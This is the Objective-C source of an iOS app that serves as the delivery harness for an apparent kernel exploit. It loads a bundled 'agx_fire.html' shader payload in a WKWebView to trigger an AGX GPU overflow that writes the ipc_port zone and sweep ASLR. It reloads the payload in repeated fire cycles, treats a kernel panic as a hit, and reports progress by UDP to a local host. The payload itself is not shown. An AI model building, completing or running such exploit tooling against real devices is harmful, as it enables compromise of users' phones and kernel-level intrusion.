/*
 * AGXFire WKWebView App v2 — Session 159 Track A
 * ================================================
 * Delivers 12-uvec4 ASLR sweep (agx_fire.html v2) in a WKWebView.
 * WKWebView bypasses Safari's WebGL security validation — shader executes on GPU.
 *
 * Detection pipeline:
 *   WKScriptMessageHandler receives JS → postMessage() callbacks
 *   "SHADER_EXECUTED" → overflow active, ipc_port zone being written
 *   "RELOAD_NOW"      → reload WKWebView to start next 260s fire cycle
 *   Qualifying hit: kernel panic IPS (monitor_v15.py detects fffffc330 in registers)
 *
 * Build:
 *   SDK=$(xcrun -sdk iphoneos --show-sdk-path)
 *   xcrun -sdk iphoneos clang -arch arm64 -mios-version-min=17.0 -O2 -fobjc-arc \
 *     -o AGXFire AGXFireApp.m -isysroot "$SDK" \
 *     -framework UIKit -framework WebKit -framework Foundation
 */

#import <UIKit/UIKit.h>
#import <WebKit/WebKit.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define HOST_IP   "192.168.68.109"
#define HOST_PORT 9999

static void udp_report(const char *msg) {
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) return;
    struct sockaddr_in sa = {};
    sa.sin_family = AF_INET;
    sa.sin_port   = htons(HOST_PORT);
    inet_pton(AF_INET, HOST_IP, &sa.sin_addr);
    sendto(fd, msg, strlen(msg), 0, (struct sockaddr*)&sa, sizeof(sa));
    close(fd);
}

@interface NexusHandler : NSObject <WKScriptMessageHandler>
@property (weak) WKWebView *webView;
@property (strong) NSURL *htmlURL;
@property (strong) NSURL *baseURL;
@end

@implementation NexusHandler
- (void)userContentController:(WKUserContentController *)ucc
      didReceiveScriptMessage:(WKScriptMessage *)msg {
    NSString *body = [msg.body description];
    NSLog(@"[AGXFirev2] JS: %@", body);
    udp_report([[NSString stringWithFormat:@"[AGXFireApp_v2] %@\n", body] UTF8String]);

    if ([body containsString:@"SHADER_EXECUTED"]) {
        udp_report("[AGXFireApp_v2] *** SHADER_EXECUTED — AGX overflow writing ipc_port zone ***\n");
        NSLog(@"[AGXFirev2] *** SHADER_EXECUTED — overflow active ***");
    }
    if ([body containsString:@"RELOAD_NOW"]) {
        NSLog(@"[AGXFirev2] RELOAD_NOW — reloading WKWebView for next fire cycle");
        udp_report("[AGXFireApp_v2] RELOAD_NOW — starting next fire cycle\n");
        dispatch_async(dispatch_get_main_queue(), ^{
            if (self.htmlURL) {
                [self.webView loadFileURL:self.htmlURL allowingReadAccessToURL:self.baseURL];
            } else {
                [self.webView reload];
            }
        });
    }
}
@end

@interface AppDelegate : UIResponder <UIApplicationDelegate>
@property (strong) UIWindow *window;
@property (strong) WKWebView *webView;
@property (strong) NexusHandler *handler;
@end

@implementation AppDelegate

- (BOOL)application:(UIApplication *)app
    didFinishLaunchingWithOptions:(NSDictionary *)opts {

    NSLog(@"[AGXFirev2] LAUNCH — AGXFireApp v2 starting");
    udp_report("[AGXFireApp_v2] LAUNCH — WKWebView AGX probe firing\n");

    self.window = [[UIWindow alloc] initWithFrame:UIScreen.mainScreen.bounds];

    // WKWebView config with JS message handler
    WKWebViewConfiguration *cfg = [WKWebViewConfiguration new];
    cfg.allowsInlineMediaPlayback = YES;
    WKPreferences *prefs = [WKPreferences new];
    prefs.javaScriptEnabled = YES;
    cfg.preferences = prefs;

    WKUserContentController *ucc = [WKUserContentController new];
    self.handler = [NexusHandler new];
    [ucc addScriptMessageHandler:self.handler name:@"nexus"];
    cfg.userContentController = ucc;

    self.webView = [[WKWebView alloc] initWithFrame:UIScreen.mainScreen.bounds
                                      configuration:cfg];

    // Wire handler so it can reload the WKWebView on RELOAD_NOW
    NSURL *htmlURL = [[NSBundle mainBundle] URLForResource:@"agx_fire"
                                             withExtension:@"html"];
    NSURL *baseURL = htmlURL ? [htmlURL URLByDeletingLastPathComponent] : nil;
    self.handler.webView   = self.webView;
    self.handler.htmlURL   = htmlURL;
    self.handler.baseURL   = baseURL;

    UIViewController *vc = [[UIViewController alloc] init];
    vc.view.backgroundColor = [UIColor blackColor];
    [vc.view addSubview:self.webView];
    self.window.rootViewController = vc;
    [self.window makeKeyAndVisible];

    if (htmlURL) {
        [self.webView loadFileURL:htmlURL allowingReadAccessToURL:baseURL];
        NSLog(@"[AGXFirev2] Loaded agx_fire.html — AGX JS will auto-fire");
        udp_report("[AGXFireApp_v2] agx_fire.html loaded — AGX JS auto-firing\n");
    } else {
        NSLog(@"[AGXFirev2] ERROR: agx_fire.html not found in bundle");
        udp_report("[AGXFireApp_v2] ERROR: agx_fire.html NOT FOUND\n");
    }

    return YES;
}

@end

int main(int argc, char *argv[]) {
    @autoreleasepool {
        return UIApplicationMain(argc, argv, nil, NSStringFromClass([AppDelegate class]));
    }
}
